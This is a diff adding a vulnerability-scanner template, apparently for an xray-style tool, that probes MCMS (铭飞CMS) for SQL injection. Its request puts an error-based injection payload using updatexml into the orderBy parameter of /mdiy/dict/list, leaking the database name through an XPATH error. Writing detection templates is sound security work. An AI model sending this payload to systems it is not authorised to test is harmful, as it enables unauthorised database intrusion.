@@ -1,0 +1,11 @@
+name: mcms-sqli
+rules:
+  - method: GET
+    path: "/mdiy/dict/list?dict=c&dictType=文章属性&orderBy=0 or updatexml(1,concat(0x7e,database(),0x7e),1)"
+    expression: |
+      response.status == 500 && response.body.bcontains(b"XPATH syntax error:")
+detail:
+  author: pzq
+  links:
+    - https://github.com/mcmsSys/MCMS
+  description: "铭飞CMS SQL注入漏洞"
